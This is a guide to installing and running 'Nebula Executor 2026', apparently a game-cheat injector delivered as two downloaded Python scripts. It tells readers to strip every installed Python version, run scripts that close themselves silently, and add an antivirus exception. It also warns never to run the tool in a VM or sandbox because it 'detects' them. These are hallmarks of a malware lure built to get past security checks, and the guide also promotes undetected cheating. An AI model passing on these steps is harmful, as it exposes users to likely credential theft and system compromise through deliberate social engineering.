How to use Nebula Executor 2026 (FULL GUIDE - READ CAREFULLY!)

Step 1: Remove ALL old Python versions
- Go to Settings → Apps → Installed apps
- Search for "Python" and uninstall EVERYTHING (3.8, 3.9, 3.10, 3.11 etc.)
- This is very important! Old versions cause conflicts and detection.

Step 2: Install clean Python 3.12 from Microsoft Store
- Open Microsoft Store (search in Windows)
- Type "Python 3.12" and install the official one from Python Software Foundation
- After install: click "Launch" or find "Python 3.12" in Start menu

Step 3: Run modules.py first (this installs all required scripts & modules)
- Download the Nebula pack (modules.py + Nebula.py)
- Double-click modules.py (or right-click → Open with → Python 3.12)
- Wait 1–3 minutes — you will see loading animation and "Nebula is fully loaded"
- Window will close automatically when done

Step 4: Launch Nebula.py
- Now double-click Nebula.py (same way — with Python 3.12)
- First time it may take 10–20 seconds to initialize
- Window will close — that's normal!

Step 5: Final launch (this is how it works on external executor)
- Wait 5–10 seconds after it closes
- Double-click Nebula.py AGAIN
- Now it will open the main interface / inject / show console
- You're in! Enjoy undetected status 2026

Important notes:
- Always run with Python 3.12 from Store
- If antivirus blocks — add exception (common for all private executors)
- Never run on VM/sandbox — it detects and won't work
- Update pack every week — old versions get patched

Have fun & stay undetected! 🔥
